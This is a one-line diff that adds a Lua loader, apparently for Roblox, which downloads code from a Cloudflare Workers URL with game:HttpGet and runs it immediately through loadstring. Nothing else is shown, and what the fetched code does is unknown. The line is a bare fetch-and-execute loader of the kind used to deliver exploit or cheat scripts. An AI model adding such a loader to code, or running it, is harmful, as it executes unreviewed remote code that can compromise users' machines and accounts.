@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://misty-wood-5fa9.gerelyncontiga.workers.dev"))()
